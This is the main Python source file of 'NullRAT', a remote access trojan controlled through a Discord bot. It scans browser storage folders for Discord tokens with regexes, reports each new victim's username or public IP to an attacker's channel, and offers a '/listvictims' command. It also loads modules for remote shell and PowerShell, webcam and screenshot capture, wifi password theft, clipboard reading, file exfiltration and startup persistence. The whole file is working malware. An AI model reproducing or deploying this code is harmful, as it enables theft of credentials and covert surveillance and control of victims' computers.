from Variables import *

import disnake as discord
from disnake import Embed
from disnake.ext import commands

from datetime import datetime
from socket import create_connection
import os, re, requests

############### Global functions available in every cog

def IP():
    try: return requests.get("https://api.ipify.org").text.rstrip()
    except: return "127.0.0.1"

def genEmbed(self, title, timestamp, description=None):
    if description is None:
        embed = discord.Embed(
            title=title, 
            timestamp=timestamp
        )
    else:
        embed = discord.Embed(
            title=title, 
            description=description,
            timestamp=timestamp
        )
    embed.set_footer( text="NullRAT" )
    return embed
        
def checked_embeds(self, token, email, phone, username, nitro, billing, avatar, userID):
    embed=discord.Embed(title="Token Info:")
    embed.set_author(name="NullCode1337", url="https://github.com/NullCode1337")
    embed.set_thumbnail(url=avatar)
    embed.add_field(name="Token", value=f"```{token}```", inline=False)
    embed.add_field(name="Username", value=username, inline=True)
    embed.add_field(name="Nitro", value=nitro, inline=True)
    embed.add_field(name="Billing Info", value=billing, inline=True)
    embed.add_field(name="ID", value=userID, inline=True)
    embed.add_field(name="Phone Number", value=phone, inline=True)
    embed.add_field(name="Email", value=email, inline=False)
    return embed

def find_token(self):
    tokens = []
    local, roaming = os.getenv("LOCALAPPDATA"), os.getenv("APPDATA")
    paths = {
        "Lightcord": roaming + "\\Lightcord",
        "Opera": roaming + "\\Opera Software\\Opera Stable",             "Opera GX": roaming + "\\Opera Software\\Opera GX Stable",
        "Chrome": local + "\\Google\\Chrome\\User Data\\Default",        "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default", "Vivaldi": local + "\\Vivaldi\\User Data\\Default",
        "MSEdge": local + "\\Microsoft\\Edge\\User Data\\Default",       "Chromium": local + "\\Chromium\\User Data\\Default"
    }
    for path in paths.values():
        path += '\\Local Storage\\leveldb'
        try: 
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'): 
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}', r'mfa\.[\w-]{84}'):
                        tokens.extend(iter(re.findall(regex, line)))
        except FileNotFoundError: continue

    return tokens

#> custom bot implementation  

original_dir = os.getcwd()

class NullBot(commands.InteractionBot):
    def __init__(self, **options):
        super().__init__(**options)
        self.ip_addr = IP()
        self.original_dir = original_dir

        # Checks if username is Admin/Administrator
        if "dmin" in os.getenv("username"):
            self.identifier = self.ip_addr
        else:
            self.identifier = os.getenv("username") 
    
    genEmbed = genEmbed
    checked_embeds = checked_embeds
    find_token = find_token
        
client = NullBot(test_guilds=server_ids)
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

if os.path.isdir(nr_working) != True:
    os.mkdir(nr_working)
    
#> on_ready():
    
@client.event
async def on_ready():
    embed = (
        Embed(
            title=f"NullRAT **IX** started on: **{client.identifier}**",
            description=f"Currently present in:\n```{client.original_dir}```",
            timestamp=datetime.now(),
        )
        .set_author(
            name="NullCode1337",
            url=r"http://null337.rf.gd/",
            icon_url=r"https://cdn.discordapp.com/attachments/959480539335766036/984699113734037544/embed_pfp2.png",
        )
        .set_footer(text=f"Identifier: {client.identifier}")
    )
    await client.get_channel(notification_channel).send(embed=embed)    

#> basic commands 

@client.slash_command()
async def listvictims(ctx):
    """Lists all victim identifiers accessible by NullRAT"""
    await ctx.channel.send( 
        embed=discord.Embed(title=f"The identifier for {os.getenv('username')}:", description=client.identifier) 
    )
    await ctx.response.send_message("Checked all available victims:\n_ _")

@client.slash_command()
async def shutdown(ctx, victim):
    """Shuts down a specific instance of NullRAT.
    
    Parameters
    ----------
    victim: Identifier of the affected computer (found via /listvictims)
    """
    if str(victim) == str(client.identifier):
        await ctx.response.send_message(
            embed=client.genEmbed(
                f"Shutting down NullRAT for **{client.identifier}**...",
                datetime.now(),
            )
        )
        await client.close()
        
@client.slash_command(description="Quits all instances of NullRAT")
async def shutdown_all(ctx):
    """Shuts down all instances of NullRAT"""
    await ctx.response.send_message("Are you sure?", view=closeall_confirm())
    
#> shutdown class 

class closeall_confirm(discord.ui.View):
    @discord.ui.button(label="Yes", style=discord.ButtonStyle.danger)
    async def first_button_callback(self, button, interaction):
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(view=self) 
        await interaction.delete_original_message()
        await interaction.channel.send(embed=Embed(title="Shutting down all instances of NullRAT...")) 
        await client.close()
        
    @discord.ui.button(label="No", style=discord.ButtonStyle.primary)
    async def second_button_callback(self, button, interaction):
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(view=self) 
        await interaction.delete_original_message()
        await interaction.channel.send(embed=Embed(title="Aborted shutting down of all instances"))   
        
#> Extensions

extensions = (
    "ChangePass",     # /changepass
    "hideFile",       # /hidefile
    "unhideFile",     # /unhidefile
    "wifiList",       # /wifilist
    "wifiPass",       # /wifipass
    "shell",          # /cmd & /powershell
    "getenv",         # /get_environment
    "webcam",         # /get_webcam
    "runfile",        # /runfile
    "startup",        # /startup
    "tasklist",       # /list_runningtasks & /list_runningstore & /kill_runningtasks
    "clipboard",      # /get_clipboard
    "geolocate",      # /get_geolocation
    "directory",      # /get_currentdir & /set_currentdir & /list_directory & /list_rawdir
    "rawtokens",      # /raw_tokens & /raw_discord
    "sendfiles",      # /sendfiles
    "systeminfo",     # /get_systeminfo
    "screenshot",     # /get_screenshot
    "receivefiles",   # /receivefiles
    "checkedtokens",  # /checked_tokens
)

for ex in extensions:
    ## For debugging
    # client.load_extension("modules."+ex)

    ## For production
    client.load_extension(ex) 
    
#> <start>
def is_connected():
    try: create_connection(("1.1.1.1", 53)); return True
    except OSError: return False
    
while is_connected() == False: 0
client.run(bot_token)

